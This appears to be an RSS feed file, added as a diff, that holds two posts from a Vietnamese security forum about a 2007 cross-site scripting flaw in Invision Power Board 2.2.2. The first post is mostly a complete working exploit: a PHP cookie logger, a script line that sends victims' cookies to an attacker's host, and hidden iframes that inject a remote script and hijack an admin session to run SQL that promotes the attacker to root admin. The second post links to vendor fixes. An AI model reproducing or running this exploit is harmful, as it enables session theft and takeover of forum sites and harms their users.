@@ -1,0 +1,142 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Invision Power Board Cross Site Scripting Vulnerability"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Invision Power Board Cross Site Scripting Vulnerability"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Invision Power Board Cross Site Scripting Vulnerability</title>
+				<description><![CDATA[ <b><font color='red'>Invision Power Board Cross Site Scripting Vulnerability</font></b>
+------------------------------------------------------------------------
+
+
+<b>SUMMARY</b>
+A vulnerability in Invision Power Board allows remote attackers to cause a  cross site scripting vulnerability which in turn can be used to cause the  administrator of the form, or any other privileged user to execute arbitrary commands (SQL commands), the following exploit code can be used to test your system for the mentioned vulnerability.
+
+<b>DETAILS</b>
+Vulnerable Systems:
+<font color='red'>* Invision Power Board version 2.2.2</font>
+
+<b>Exploit:</b>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+#
+# Invision Power Board 2.2.2 Cross Site Scripting vulnerability
+#
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+# Vendor site:<span class="link"> http://www.invisionboard.com/</span>
+# Vulnerability found by Iron &#40;http://www.ironwarez.info&#41;
+#
+# Greets to all RootShell Security Group members
+#
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+# The vulnerability:
+# Open up any php file in /jscripts/folder_rte_files
+#  See:
+
+    var editor_id         = &lt;?php print 
+'"'.trim&#40;$_REQUEST&#91;'editorid'&#93;&#41;.'";'; ?&gt;
+ 
+#
+# $_REQUEST&#91;'editorid'&#93; isn't sanitized in any way, so allows
+# other uses to execute their own code.
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+# PoC &#40;Log cookies & run SQL query&#41;
+#
+# Requirements: server supporting PHP, user account on
+# target forum, database prefix needs to be known.
+#
+# Create a file called name.php on your webserver and put this code in it:
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+
+&lt;?php
+$target = "http://www.yourtarget.com/forum"; #Target forum without 
+trailing slash
+$prefix = "ibf_"; #Database prefix, default: ibf_
+$member = 22; #Member id to promote
+$newgroup = 4; # The id of the new group to promote, normally 4 is root 
+admin
+
+$ip = $_SERVER&#91;'REMOTE_ADDR'&#93;;
+$referer = $_SERVER&#91;'HTTP_REFERER'&#93;;
+$agent = $_SERVER&#91;'HTTP_USER_AGENT'&#93;;
+
+$data = $_GET&#91;'c'&#93;;
+$time = date&#40;"Y-m-d G:i:s A"&#41;;
+$text = "Time: 
+".$time."\nIP:".$ip."\nReferer:".$referer."\nUser-Agent:".$agent."\nCookie:".$data."\n\n";
+
+$file = fopen&#40;'log.txt' , 'a'&#41;;
+fwrite&#40;$file,$text&#41;;
+fclose&#40;$file&#41;;
+if&#40;preg_match&#40;"/ipb_admin_session_id=&#40;&#91;0-9a-z&#93;{32}&#41;;/",$data,$stuff&#41;&#41;
+{
+print '&lt;iframe width=0 height=0 
+src="'.$target.'/admin/index.php?adsess='.$stuff&#91;1&#93;.'&act=sql&code=runsql&section=admin&query=UPDATE+'.$prefix.'members+SET+mgroup+%3D+%27'.$newgroup.'%27+WHERE+id+%3D+%27'.$member.'%27&st="&gt;&lt;/iframe&gt;';
+}
+?&gt;
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+#  Also create a file in the same directory named "log.txt" and chmod it 
+777
+#
+#  Now, create a file called script.js on your webserver, put this code in 
+it:
+#
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+
+document.location="http://www.yourownsite.com/path/to/file/name.php?c="+document.cookie;
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+#
+#  And, last but not least, create a file that combines those two ;&#41;
+#  Name it blah.html and put this code in it:
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+
+&lt;iframe border=0 
+src="http://www.targetforum.com/forum_folder/jscripts/folder_rte_files/module_table.php?editorid=//--&gt;&lt;/script&gt;&lt;script src=http://www.yourownsite.com/path/to/file/script.js&gt;" width=0 height=0&gt;&lt;/iframe&gt;
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
+#
+# Now, post a message on the forum or send a pm to your target with the 
+link to the html page.
+#  If a normal user views the page, his cookies
+#  will be logged, funny. If an admin visits the page and he has an 
+admin_session_id cookie set,
+# he will add you to the root admin group without even knowing ;&#41;.</pre>
+		</div>
+
+
+<b>ADDITIONAL INFORMATION</b>
+The information has been provided by Iron.
+The original article can be found at: <span class="link"> http://www.ironwarez.info</span>
+
+
+<b><font color='red'>Comment: sắp sửa có một loạt IBP bị phá hoại.</font></b>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10965.hva#63100</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/10965.hva#63100</link>
+				<pubDate><![CDATA[Mon, 4 Jun 2007 07:26:02]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Invision Power Board Cross Site Scripting Vulnerability</title>
+				<description><![CDATA[ Fix cho ver 2.2.x đến ngày 30/5/2007 tại đây: 
+http://forums.invisionpower.com/index.php?showtopic=234377
+http://forums.invisionpower.com/index.php?showtopic=235069]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10965.hva#63269</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/10965.hva#63269</link>
+				<pubDate><![CDATA[Tue, 5 Jun 2007 02:50:11]]> GMT</pubDate>
+				<author><![CDATA[ Z0rr0]]></author>
+			</item>
+	</channel>
+</rss>
